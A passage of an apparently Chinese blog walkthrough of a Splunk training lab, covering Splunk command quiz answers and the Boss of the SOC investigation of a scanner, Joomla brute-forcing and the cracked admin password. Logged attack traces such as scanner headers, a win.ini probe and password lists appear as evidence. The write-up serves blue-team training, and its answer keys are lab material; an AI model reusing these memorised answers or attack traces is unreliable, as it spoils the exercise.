<h2 id="2-18-时间日期字段"><a href="#2-18-时间日期字段" class="headerlink" title="2.18 时间日期字段"></a>2.18 时间日期字段</h2><p>Splunk中时间日期字段的专有名称是什么</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_time</span><br></pre></td></tr></table></figure>

<h2 id="2-19-前几个值"><a href="#2-19-前几个值" class="headerlink" title="2.19 前几个值"></a>2.19 前几个值</h2><p>如何只得到在搜索中找到的前几个值？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head</span><br></pre></td></tr></table></figure>

<h2 id="2-20-反转顺序"><a href="#2-20-反转顺序" class="headerlink" title="2.20 反转顺序"></a>2.20 反转顺序</h2><p>比您想象的还要有用，如何反转返回结果的顺序？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reverse</span><br></pre></td></tr></table></figure>

<h2 id="2-21-重命名字段"><a href="#2-21-重命名字段" class="headerlink" title="2.21 重命名字段"></a>2.21 重命名字段</h2><p>查看搜索结果时，通常使用用户提供的值表来重命名字段。 我们要在搜索中包括哪些命令来执行此操作？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lookup</span><br></pre></td></tr></table></figure>

<h2 id="2-22-特定时间范围"><a href="#2-22-特定时间范围" class="headerlink" title="2.22 特定时间范围"></a>2.22 特定时间范围</h2><p>我们可以将事件收集到特定的时间范围中，以用于进一步处理。 我们要在搜索中包括什么命令来做到这一点？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bucket</span><br></pre></td></tr></table></figure>

<h2 id="2-23-图表使用特定时间长度"><a href="#2-23-图表使用特定时间长度" class="headerlink" title="2.23 图表使用特定时间长度"></a>2.23 图表使用特定时间长度</h2><p>我们还可以将数据定义为要在图表命令中使用的特定时间段，我们使用什么命令来设置这些时间长度？ 这与之前的问题不同，因为我们不再收集进行进一步处理。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">span</span><br></pre></td></tr></table></figure>

<h2 id="2-24-事件统计数量"><a href="#2-24-事件统计数量" class="headerlink" title="2.24 事件统计数量"></a>2.24 事件统计数量</h2><p>在生成有关搜索的统计信息时，通常对事件的发生进行计数，我们包括执行此命令的命令是什么？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">count</span><br></pre></td></tr></table></figure>

<h2 id="2-25-splunk-apps"><a href="#2-25-splunk-apps" class="headerlink" title="2.25 splunk apps"></a>2.25 splunk apps</h2><p>最后但并非最不重要的一点是，您可以在哪里找到Splunk应用程序的网站？</p>
<h2 id="2-26-添加新功能"><a href="#2-26-添加新功能" class="headerlink" title="2.26 添加新功能"></a>2.26 添加新功能</h2><p>我们还可以将新功能添加到Splunk中，这些新功能是什么？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apps</span><br></pre></td></tr></table></figure>

<h2 id="2-27-SOC含义"><a href="#2-27-SOC含义" class="headerlink" title="2.27 SOC含义"></a>2.27 SOC含义</h2><p>SOC代表什么？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">security operations center</span><br></pre></td></tr></table></figure>

<h2 id="2-28-SIEM含义"><a href="#2-28-SIEM含义" class="headerlink" title="2.28 SIEM含义"></a>2.28 SIEM含义</h2><p>SIEM代表什么？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">security information events management</span><br></pre></td></tr></table></figure>

<h2 id="2-29-BOTS含义"><a href="#2-29-BOTS含义" class="headerlink" title="2.29 BOTS含义"></a>2.29 BOTS含义</h2><p>BOTS呢？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">boss of the soc</span><br></pre></td></tr></table></figure>

<h2 id="2-30-CIM含义"><a href="#2-30-CIM含义" class="headerlink" title="2.30 CIM含义"></a>2.30 CIM含义</h2><p>CIM呢？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">common information model</span><br></pre></td></tr></table></figure>

<h2 id="2-31-Splunk论坛"><a href="#2-31-Splunk论坛" class="headerlink" title="2.31 Splunk论坛"></a>2.31 Splunk论坛</h2><p>您可以在哪里找到Splunk论坛的网站？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">answers.splunk.com</span><br></pre></td></tr></table></figure>

<h1 id="3-BOTS"><a href="#3-BOTS" class="headerlink" title="3. BOTS"></a>3. BOTS</h1><p>在通过命令测验对Splunk进行了令人愉快的介绍之后，我们将访问Splunk在其”Boss of the SOC”安全运营中心竞赛中直接生成的一些培训材料！</p>
<p><a href="https://www.splunk.com/en_us/blog/security/what-you-need-to-know-about-boss-of-the-soc.html" target="_blank" rel="noopener">https://www.splunk.com/en_us/blog/security/what-you-need-to-know-about-boss-of-the-soc.html</a></p>
<h1 id="4-Halp-I’m-drowning-in-logs"><a href="#4-Halp-I’m-drowning-in-logs" class="headerlink" title="4. Halp, I’m drowning in logs!"></a>4. Halp, I’m drowning in logs!</h1><p>就是介绍下<strong>Investigating with Splunk Workshop</strong></p>
<p>以及<strong>ATT&amp;CK</strong></p>
<h1 id="5-Advanced-Persistent-Threat"><a href="#5-Advanced-Persistent-Threat" class="headerlink" title="5. Advanced Persistent Threat"></a>5. Advanced Persistent Threat</h1><p>根据提供的数据追踪<strong>P01s0n1vy!</strong></p>
<h2 id="5-1-What-IP-is-scanning-our-web-server"><a href="#5-1-What-IP-is-scanning-our-web-server" class="headerlink" title="5.1 What IP is scanning our web server?"></a>5.1 What IP is scanning our web server?</h2><p>需要找出扫描来源IP，首先查看index：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* | stats count by index</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>index</th>
<th>count</th>
</tr>
</thead>
<tbody><tr>
<td>botsv1</td>
<td>955807</td>
</tr>
<tr>
<td>main</td>
<td>479</td>
</tr>
</tbody></table>
<p>两个index，首先看一下main，根据source筛选排序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* index&#x3D;main </span><br><span class="line">| stats count by source </span><br><span class="line">| sort -count</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>source</th>
<th>count</th>
</tr>
</thead>
<tbody><tr>
<td>stream:Splunk_HTTPURI</td>
<td>345</td>
</tr>
<tr>
<td>stream:Splunk_IP</td>
<td>49</td>
</tr>
<tr>
<td>stream:Splunk_HTTPStatus</td>
<td>31</td>
</tr>
<tr>
<td>stream:Splunk_Udp</td>
<td>18</td>
</tr>
<tr>
<td>stream:Splunk_HTTPClient</td>
<td>10</td>
</tr>
<tr>
<td>stream:Splunk_HTTPResponseTime</td>
<td>10</td>
</tr>
<tr>
<td>stream:Splunk_Tcp</td>
<td>10</td>
</tr>
<tr>
<td>stream:Splunk_DNSIntegrity</td>
<td>8</td>
</tr>
<tr>
<td>stream:Splunk_DNSRequestResponse</td>
<td>6</td>
</tr>
<tr>
<td>stream:Splunk_DNSServerQuery</td>
<td>6</td>
</tr>
<tr>
<td>stream:Splunk_DNSServerResponse</td>
<td>6</td>
</tr>
<tr>
<td>stream:Splunk_DNSClientQueryTypes</td>
<td>3</td>
</tr>
</tbody></table>
<p>最多的是HTTPURI</p>
<p>然后再看一下另一个index：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* index&#x3D;botsv1</span><br><span class="line">| stats count by source </span><br><span class="line">| sort -count </span><br><span class="line">| head 10</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>source</th>
<th>count</th>
</tr>
</thead>
<tbody><tr>
<td>WinEventLog:Microsoft-Windows-Sysmon/Operational</td>
<td>270597</td>
</tr>
<tr>
<td>stream:smb</td>
<td>151568</td>
</tr>
<tr>
<td>/var/log/suricata/eve.json</td>
<td>125584</td>
</tr>
<tr>
<td>WinEventLog:Security</td>
<td>87430</td>
</tr>
<tr>
<td>udp:514</td>
<td>80922</td>
</tr>
<tr>
<td>WinRegistry</td>
<td>74720</td>
</tr>
<tr>
<td>stream:ip</td>
<td>62083</td>
</tr>
<tr>
<td>stream:tcp</td>
<td>28291</td>
</tr>
<tr>
<td>stream:http</td>
<td>23936</td>
</tr>
<tr>
<td>C:\inetpub\logs\LogFiles\W3SVC1\u_ex160810.log</td>
<td>22401</td>
</tr>
</tbody></table>
<p>里面有stream:http，直接使用这个筛选排序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 sourcetype&#x3D;stream:http </span><br><span class="line">| stats count by src_ip </span><br><span class="line">| sort -count</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>src_ip</th>
<th>count</th>
</tr>
</thead>
<tbody><tr>
<td>40.80.148.42</td>
<td>20997</td>
</tr>
<tr>
<td>23.22.63.114</td>
<td>1430</td>
</tr>
<tr>
<td>192.168.2.50</td>
<td>818</td>
</tr>
<tr>
<td>192.168.250.100</td>
<td>265</td>
</tr>
<tr>
<td>192.168.250.70</td>
<td>8</td>
</tr>
</tbody></table>
<p>第一个的count明显非常大，得到扫描器IP</p>
<h2 id="5-2-What-web-scanner-scanned-the-server"><a href="#5-2-What-web-scanner-scanned-the-server" class="headerlink" title="5.2 What web scanner scanned the server?"></a>5.2 What web scanner scanned the server?</h2><p>判断是什么扫描器，那就是常规的直接看HTTP Header：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 sourcetype&#x3D;stream:http src_ip&#x3D;&quot;40.80.148.42&quot; </span><br><span class="line">| stats count by  src_headers </span><br><span class="line">| sort -count </span><br><span class="line">| head 3</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>src_headers</th>
<th>count</th>
</tr>
</thead>
<tbody><tr>
<td>POST /joomla/index.php/component/search/ HTTP/1.1 Content-Length: 99 Content-Type: application/x-www-form-urlencoded Cookie: ae72c62a4936b238523950a4f26f67d0=v7ikb3m59romokqmbiet3vphv3 Host: imreallynotbatman.com Connection: Keep-alive Accept-Encoding: gzip,deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - Free Edition) Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED Acunetix-User-agreement: <a href="http://www.acunetix.com/wvs/disc.htm" target="_blank" rel="noopener">http://www.acunetix.com/wvs/disc.htm</a> Accept: <em>/</em></td>
<td>99</td>
</tr>
<tr>
<td>POST /joomla/index.php/component/search/ HTTP/1.1 Content-Length: 101 Content-Type: application/x-www-form-urlencoded Cookie: ae72c62a4936b238523950a4f26f67d0=v7ikb3m59romokqmbiet3vphv3 Host: imreallynotbatman.com Connection: Keep-alive Accept-Encoding: gzip,deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - Free Edition) Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED Acunetix-User-agreement: <a href="http://www.acunetix.com/wvs/disc.htm" target="_blank" rel="noopener">http://www.acunetix.com/wvs/disc.htm</a> Accept: <em>/</em></td>
<td>97</td>
</tr>
<tr>
<td>POST /joomla/index.php/component/search/ HTTP/1.1 Content-Length: 102 Content-Type: application/x-www-form-urlencoded Cookie: ae72c62a4936b238523950a4f26f67d0=v7ikb3m59romokqmbiet3vphv3 Host: imreallynotbatman.com Connection: Keep-alive Accept-Encoding: gzip,deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - Free Edition) Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED Acunetix-User-agreement: <a href="http://www.acunetix.com/wvs/disc.htm" target="_blank" rel="noopener">http://www.acunetix.com/wvs/disc.htm</a> Accept: <em>/</em></td>
<td>97</td>
</tr>
</tbody></table>
<p>很明显是AWVS，答案是”acunetix”</p>
<h2 id="5-3-What-is-the-IP-address-of-our-web-server"><a href="#5-3-What-is-the-IP-address-of-our-web-server" class="headerlink" title="5.3 What is the IP address of our web server?"></a>5.3 What is the IP address of our web server?</h2><p>问我们的web server ip地址，那就是看dest_ip：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 sourcetype&#x3D;stream:http src_ip&#x3D;&quot;40.80.148.42&quot; </span><br><span class="line">| stats count by dest_ip </span><br><span class="line">| sort -count</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>dest_ip</th>
<th>count</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.250.70</td>
<td>20996</td>
</tr>
<tr>
<td>192.168.250.40</td>
<td>1</td>
</tr>
</tbody></table>
<p>很明显是192.168.250.70</p>
<h2 id="5-4-What-content-management-system-is-imreallynotbatman-com-using"><a href="#5-4-What-content-management-system-is-imreallynotbatman-com-using" class="headerlink" title="5.4 What content management system is imreallynotbatman.com using?"></a>5.4 What content management system is imreallynotbatman.com using?</h2><p>我们的web是imreallynotbatman.com，前面的搜索参考资料里就加有这个关键词，不过测试环境没其他数据干扰不加也没影响。</p>
<p>这里是问我们的web用的是哪种CMS，首先查看下URI格式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 imreallynotbatman.com sourcetype&#x3D;stream:http src_ip&#x3D;&quot;40.80.148.42&quot;</span><br><span class="line">| stats count by uri </span><br><span class="line">| sort -count </span><br><span class="line">| head 10</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>uri</th>
<th>count</th>
</tr>
</thead>
<tbody><tr>
<td>/joomla/index.php/component/search/</td>
<td>14218</td>
</tr>
<tr>
<td>/joomla/index.php</td>
<td>798</td>
</tr>
<tr>
<td>/</td>
<td>517</td>
</tr>
<tr>
<td>/windows/win.ini</td>
<td>33</td>
</tr>
<tr>
<td>/joomla/media/jui/js/jquery-migrate.min.js</td>
<td>18</td>
</tr>
<tr>
<td>/joomla/media/jui/js/jquery-noconflict.js</td>
<td>18</td>
</tr>
<tr>
<td>/joomla/administrator/index.php</td>
<td>17</td>
</tr>
<tr>
<td>/joomla/media/jui/js/bootstrap.min.js</td>
<td>17</td>
</tr>
<tr>
<td>/joomla/media/system/js/html5fallback.js</td>
<td>13</td>
</tr>
<tr>
<td>/joomla/templates/protostar/js/template.js</td>
<td>13</td>
</tr>
</tbody></table>
<p>明显的joomla</p>
<h2 id="5-5-What-address-is-performing-the-brute-forcing-attack-against-our-website"><a href="#5-5-What-address-is-performing-the-brute-forcing-attack-against-our-website" class="headerlink" title="5.5 What address is performing the brute-forcing attack against our website?"></a>5.5 What address is performing the brute-forcing attack against our website?</h2><p>问哪个地址在进行爆破，首先使用扫描器的IP进行筛选分析method，因为扫描器的请求比较全面：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 imreallynotbatman.com sourcetype&#x3D;stream:http src_ip&#x3D;&quot;40.80.148.42&quot; </span><br><span class="line">| stats count by http_method </span><br><span class="line">| sort -count</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>http_method</th>
<th>count</th>
</tr>
</thead>
<tbody><tr>
<td>POST</td>
<td>15146</td>
</tr>
<tr>
<td>GET</td>
<td>5766</td>
</tr>
<tr>
<td>OPTIONS</td>
<td>5</td>
</tr>
<tr>
<td>CONNECT</td>
<td>1</td>
</tr>
<tr>
<td>PROPFIND</td>
<td>1</td>
</tr>
<tr>
<td>TRACE</td>
<td>1</td>
</tr>
</tbody></table>
<p>最多的是POST，正常登录类就是POST比较多。</p>
<p>然后筛选出登录相关请求格式，这里就是dest_content：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 imreallynotbatman.com sourcetype&#x3D;stream:http src_ip&#x3D;&quot;40.80.148.42&quot; http_method&#x3D;&quot;POST&quot; username </span><br><span class="line">| table dest_content </span><br><span class="line">| head 1</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;&#x2F;joomla&#x2F;administrator&#x2F;index.php&quot; method&#x3D;&quot;post&quot; id&#x3D;&quot;form-login&quot; class&#x3D;&quot;form-inline&quot;&gt;</span><br><span class="line"></span><br><span class="line">    [REDACTED]</span><br><span class="line"></span><br><span class="line">    &lt;input name&#x3D;&quot;username&quot; tabindex&#x3D;&quot;1&quot; id&#x3D;&quot;mod-login-username&quot; type&#x3D;&quot;text&quot; class&#x3D;&quot;input-medium&quot; placeholder&#x3D;&quot;Username&quot; size&#x3D;&quot;15&quot; autofocus&#x3D;&quot;true&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">    [REDACTED]</span><br><span class="line"></span><br><span class="line">    &lt;input name&#x3D;&quot;passwd&quot; tabindex&#x3D;&quot;2&quot; id&#x3D;&quot;mod-login-password&quot; type&#x3D;&quot;password&quot; class&#x3D;&quot;input-medium&quot; placeholder&#x3D;&quot;Password&quot; size&#x3D;&quot;15&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">    [REDACTED]</span><br><span class="line"></span><br><span class="line">    &lt;button tabindex&#x3D;&quot;3&quot; class&#x3D;&quot;btn btn-primary btn-block btn-large&quot;&gt;</span><br><span class="line">        &lt;span class&#x3D;&quot;icon-lock icon-white&quot;&gt;&lt;&#x2F;span&gt; Log in                   &lt;&#x2F;button&gt;</span><br><span class="line"></span><br><span class="line">    [REDACTED]</span><br><span class="line"></span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;option&quot; value&#x3D;&quot;com_login&quot;&#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;task&quot; value&#x3D;&quot;login&quot;&#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;return&quot; value&#x3D;&quot;aW5kZXgucGhw&quot;&#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;da4c70bcedf77f722881e18fb076b963&quot; value&#x3D;&quot;1&quot; &#x2F;&gt;   &lt;&#x2F;fieldset&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">[REDACTED]</span><br></pre></td></tr></table></figure>

<p>主要就是username和passwd</p>
<p>然后使用这个条件筛选：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 imreallynotbatman.com sourcetype&#x3D;stream:http http_method&#x3D;&quot;POST&quot; form_data&#x3D;*username*passwd* </span><br><span class="line">| stats count by src_ip</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>src_ip</th>
<th>count</th>
</tr>
</thead>
<tbody><tr>
<td>23.22.63.114</td>
<td>412</td>
</tr>
<tr>
<td>40.80.148.42</td>
<td>1</td>
</tr>
</tbody></table>
<p>扫描器没进行爆破，爆破的是23.22.63.114</p>
<h2 id="5-6-What-was-the-first-password-attempted-in-the-attack"><a href="#5-6-What-was-the-first-password-attempted-in-the-attack" class="headerlink" title="5.6 What was the first password attempted in the attack?"></a>5.6 What was the first password attempted in the attack?</h2><p>攻击中尝试输入的第一个密码是什么，那就是正则提取出用户名密码，根据时间排序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 imreallynotbatman.com sourcetype&#x3D;stream:http http_method&#x3D;&quot;POST&quot; form_data&#x3D;*username*passwd* </span><br><span class="line">| rex field&#x3D;form_data &quot;username&#x3D;(?&lt;u&gt;\w+)&quot; </span><br><span class="line">| rex field&#x3D;form_data &quot;passwd&#x3D;(?&lt;p&gt;\w+)&quot; </span><br><span class="line">| table _time, u, p </span><br><span class="line">| sort by _time</span><br><span class="line">| head 5</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>_time</th>
<th>u</th>
<th>p</th>
</tr>
</thead>
<tbody><tr>
<td>2016/08/10 21:45:21.226</td>
<td>admin</td>
<td>12345678</td>
</tr>
<tr>
<td>2016/08/10 21:45:21.241</td>
<td>admin</td>
<td>letmein</td>
</tr>
<tr>
<td>2016/08/10 21:45:21.247</td>
<td>admin</td>
<td>qwerty</td>
</tr>
<tr>
<td>2016/08/10 21:45:21.250</td>
<td>admin</td>
<td>1234</td>
</tr>
<tr>
<td>2016/08/10 21:45:21.260</td>
<td>admin</td>
<td>123456</td>
</tr>
</tbody></table>
<h2 id="5-7-One-of-the-passwords-in-the-brute-force-attack-is-James-Brodsky’s-favorite-Coldplay-song-Which-six-character-song-is-it"><a href="#5-7-One-of-the-passwords-in-the-brute-force-attack-is-James-Brodsky’s-favorite-Coldplay-song-Which-six-character-song-is-it" class="headerlink" title="5.7 One of the passwords in the brute force attack is James Brodsky’s favorite Coldplay song. Which six character song is it?"></a>5.7 One of the passwords in the brute force attack is James Brodsky’s favorite Coldplay song. Which six character song is it?</h2><p>暴力破解的密码之一是詹姆斯·布罗德斯基（James Brodsky）最喜欢的Coldplay歌曲。 歌名六个字符？</p>
<p>这个首先去<a href="https://en.wikipedia.org/wiki/List_of_songs_recorded_by_Coldplay，去把所有歌名做成csv，然后导入到splunk里作为Lookups：" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/List_of_songs_recorded_by_Coldplay，去把所有歌名做成csv，然后导入到splunk里作为Lookups：</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| inputlookup coldplay.csv</span><br></pre></td></tr></table></figure>

<p>然后把密码中所有6个字符过滤出来在lookup里查找：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 sourcetype&#x3D;stream:http form_data&#x3D;*username*passwd*</span><br><span class="line">| rex field&#x3D;form_data &quot;passwd&#x3D;(?&lt;userpassword&gt;\w+)&quot;</span><br><span class="line">| eval lenpword&#x3D;len(userpassword)</span><br><span class="line">| search lenpword&#x3D;6</span><br><span class="line">| eval password&#x3D;lower(userpassword)</span><br><span class="line">| lookup coldplay.csv song as password OUTPUTNEW song</span><br><span class="line">| search song&#x3D;*</span><br><span class="line">| table song</span><br></pre></td></tr></table></figure>

<p>Answer: <code>yellow</code></p>
<h2 id="5-8-What-was-the-correct-password-for-admin-access-to-the-content-management-system-running-imreallynotbatman-com"><a href="#5-8-What-was-the-correct-password-for-admin-access-to-the-content-management-system-running-imreallynotbatman-com" class="headerlink" title="5.8 What was the correct password for admin access to the content management system running imreallynotbatman.com?"></a>5.8 What was the correct password for admin access to the content management system running imreallynotbatman.com?</h2><p>管理员访问运行imreallynotbatman.com的CMS的正确密码是什么？</p>
<p>因为错误密码都只尝试一次，简单过滤一下就可以：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 imreallynotbatman.com sourcetype&#x3D;stream:http http_method&#x3D;&quot;POST&quot; form_data&#x3D;*username*passwd* </span><br><span class="line">| rex field&#x3D;form_data &quot;passwd&#x3D;(?&lt;p&gt;\w+)&quot; </span><br><span class="line">| stats count by p </span><br><span class="line">| sort -count</span><br><span class="line">| table p,count</span><br><span class="line">| head 10</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>p</th>
<th>count</th>
</tr>
</thead>
<tbody><tr>
<td>batman</td>
<td>2</td>
</tr>
<tr>
<td>000000</td>
<td>1</td>
</tr>
<tr>
<td>1111</td>
<td>1</td>
</tr>
<tr>
<td>111111</td>
<td>1</td>
</tr>
<tr>
<td>11111111</td>
<td>1</td>
</tr>
<tr>
<td>112233</td>
<td>1</td>
</tr>
<tr>
<td>1212</td>
<td>1</td>
</tr>
<tr>
<td>121212</td>
<td>1</td>
</tr>
<tr>
<td>123123</td>
<td>1</td>
</tr>
<tr>
<td>1234</td>
<td>1</td>
</tr>
</tbody></table>
<p> 正确密码是”batman”</p>
<h2 id="5-9-What-was-the-average-password-length-used-in-the-password-brute-forcing-attempt-rounded-to-closest-whole-integer"><a href="#5-9-What-was-the-average-password-length-used-in-the-password-brute-forcing-attempt-rounded-to-closest-whole-integer" class="headerlink" title="5.9 What was the average password length used in the password brute forcing attempt rounded to closest whole integer?"></a>5.9 What was the average password length used in the password brute forcing attempt rounded to closest whole integer?</h2><p>密码暴力破解尝试中使用的平均密码长度是多少？四舍五入到最接近的整数.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 imreallynotbatman.com sourcetype&#x3D;stream:http http_method&#x3D;&quot;POST&quot; form_data&#x3D;*username*passwd* </span><br><span class="line">| rex field&#x3D;form_data &quot;passwd&#x3D;(?&lt;p&gt;\w+)&quot; </span><br><span class="line">| eval pl&#x3D;len(p) </span><br><span class="line">| stats avg(pl) as av</span><br><span class="line">| eval avg_count&#x3D;round(av,0) </span><br><span class="line">| table avg_count</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>avg_count</th>
</tr>
</thead>
<tbody><tr>
<td>6</td>
</tr>
</tbody></table>
<h2 id="5-10-How-many-seconds-elapsed-between-the-time-the-brute-force-password-scan-identified-the-correct-password-and-the-compromised-login-rounded-to-2-decimal-places"><a href="#5-10-How-many-seconds-elapsed-between-the-time-the-brute-force-password-scan-identified-the-correct-password-and-the-compromised-login-rounded-to-2-decimal-places" class="headerlink" title="5.10 How many seconds elapsed between the time the brute force password scan identified the correct password and the compromised login rounded to 2 decimal places?"></a>5.10 How many seconds elapsed between the time the brute force password scan identified the correct password and the compromised login rounded to 2 decimal places?</h2><p>从爆破出正确密码到开始扫描(扫描器配置正确密码)中间间隔多少秒，两位小数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index&#x3D;botsv1 sourcetype&#x3D;stream:http form_data&#x3D;*username*passwd* | rex field&#x3D;form_data &quot;passwd&#x3D;(?&lt;p&gt;\w+)&quot; </span><br><span class="line">| search p&#x3D;&quot;batman&quot; </span><br><span class="line">| table _time, p, src_ip</span><br><span class="line">| sort by _time</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>_time</th>
<th>p</th>
<th>src_ip</th>
</tr>
</thead>
<tbody><tr>
<td>2016/08/10 21:46:33.689</td>
<td>batman</td>
<td>23.22.63.114</td>
</tr>
<tr>
<td>2016/08/10 21:48:05.858</td>
<td>batman</td>
<td>40.80.148.42</td>
</tr>
</tbody></table>
